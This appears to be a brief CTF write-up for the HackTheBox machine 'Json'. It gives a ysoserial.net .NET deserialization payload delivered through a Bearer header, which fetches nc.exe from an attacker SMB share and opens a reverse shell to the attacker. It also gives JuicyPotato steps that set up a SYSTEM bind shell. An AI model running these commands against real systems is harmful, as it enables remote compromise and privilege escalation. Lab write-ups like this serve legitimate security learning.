---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/sZF9sr32SzE/0.jpg
layout: post
media_subpath: /assets/posts/2020-02-15-json-hackthebox
tags:
- .net
- deserialization
- potato
- seimpersonate
title: Json @ HackTheBox
---

Json is a 30-point system on HackTheBox that involves exploiting a .NET deserialization vulnerability and has multiple ways for privilege escalation. You can reverse a binary, exploit ftp or use the juicypotato exploit in order to become SYSTEM.

{% youtube sZF9sr32SzE %}

## Notes

Exploit deserialization vulnerability in bearer header:

```
ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "\\<ip>\xct\nc.exe <lhost> 7000 -e cmd.exe"
```

```
sudo impacket-smbserver xct xct/ -smb2support
nc -lvp 7000
```

```
GET /api/Account/ HTTP/1.1
Host: json.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://json.htb/index.html
Bearer: <ysoserial.net payload>
Connection: close
Cookie: OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=
```

[Juicy potato](https://github.com/ohpe/juicy-potato) (because the system uses windows server 2012 and we have the *SeImpersonate* privilege):

```
copy \\<lhost>\xct\JuicyPotato.exe juicy.exe
copy \\<lhost>\xct\nc.exe nc.exe
echo c:\xct\nc.exe -lvp 2000 -e cmd.exe > juicy.bat

juicy.exe -l 1337 -p c:\xct\juicy.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

nc json.htb 2000
```